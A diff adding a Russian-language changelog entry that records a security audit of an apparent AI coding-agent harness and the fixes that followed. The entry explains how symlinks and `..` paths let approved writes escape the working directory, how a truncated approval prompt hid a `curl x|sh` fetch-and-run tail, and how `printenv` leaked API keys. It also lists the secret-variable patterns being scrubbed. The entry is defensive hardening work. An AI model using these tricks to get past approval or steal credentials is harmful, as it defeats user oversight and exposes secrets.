@@ -6,6 +6,46 @@
 
 ## 2026-11-08
 
+### Аудит безопасности: `write`/`edit` заперты в cwd, подтверждение целиком, env детей без секретов
+- `write` и `edit` пишут только внутри cwd: цель резолвится покомпонентно
+  (`tools/confine.rs::confine_target` — существующая часть по диску с
+  раскрытием симлинков, недостающие подкаталоги простыми именами), итог
+  обязан лежать внутри канонизированного cwd, пишется резолвленный путь.
+  Абсолютный путь наружу, `..`, симлинк-файл или симлинк-каталог наружу —
+  отказ с явным «Path X is outside the working directory … `write` only
+  changes files inside the working directory» даже для несуществующего
+  пути; висячий симлинк — отказ своим текстом («goes through a symlink
+  whose target does not exist») (у `read` там по-прежнему «File not found» —
+  различие осознанное, `docs/decisions.md`). Запись в новый подкаталог
+  внутри cwd и симлинк внутрь работают как раньше; схемы `path` у
+  `write`/`edit` говорят «inside the working directory».
+  `approval_prompt` (CLI): ключевое поле — `bash.command` (многострочное —
+  блоком), `write`/`edit.path`, `web_fetch.url`, `web_search.query` —
+  целиком, остальные аргументы следом строкой JSON до 500 символов с
+  пометкой «[обрезано: показано N из M символов]», управляющие/bidi-символы
+  экранируются. `bash` и post-edit проверка (общий `run_shell`) снимают с
+  окружения ребёнка `*_API_KEY`, `*_SECRET`, `*_TOKEN`, `*_PASSWORD`,
+  `*_CREDENTIALS`, `ANTHROPIC_*`, `OPENAI_*`, `AWS_SECRET*`, `GH_TOKEN*`,
+  `GITHUB_TOKEN*` (`scrub_env`); харнесс свой ключ читает как раньше.
+  Тест `write::absolute_paths_are_used_as_is`, закреплявший запись в чужую
+  директорию, перевёрнут (`absolute_paths_inside_the_cwd_are_allowed` +
+  `absolute_path_outside_is_refused`); `approval_prompt_shows_tool_and_question`
+  переписан под новый формат. +22 теста (ядро 372 → 390 и 1 проба под
+  `#[ignore]`, которую запускает живой тест; CLI 60 → 64).
+  ← Аудит 2026-11-08 (High ×2, Medium): симлинк `notes.md -> ~/.zshrc` в
+  чужом репо превращал одобренное «write notes.md» в перезапись `.zshrc`,
+  `..` и абсолютные пути открывали `~/.config/mark2`, `.git/hooks`,
+  `verify.sh` бенча; подтверждение резало аргументы на 96 символах, и хвост
+  `…; curl x|sh` или URL за подложенным ключом `note` пользователь не видел;
+  `printenv` в команде модели уносил `ZAI_API_KEY` в контекст, сессию и
+  логи.
+  → Мутации границы ловятся (без `starts_with` падают 10 тестов, без учёта
+  `..` после несуществующего компонента — 1, без `scrub_env` — живой тест
+  на спавне); в подтверждении нет `…` у одобряемого поля при любой длине.
+  Преамбула (промпт + локальные тулы) 3978 → 3986 символов из 4000
+  (whole_file 3622 → 3630). Цена: память выше cwd или `memory_file`
+  снаружи больше не правится `write`/`edit`.
+
 ### Гейт инвертирован: незнакомый тул заперт, свобода — только из allowlist
 - `permission::READ_ONLY_TOOLS` (`read`, `grep`) — публичный allowlist:
   `PermissionPolicy::check` пропускает без гейта только его, всё остальное
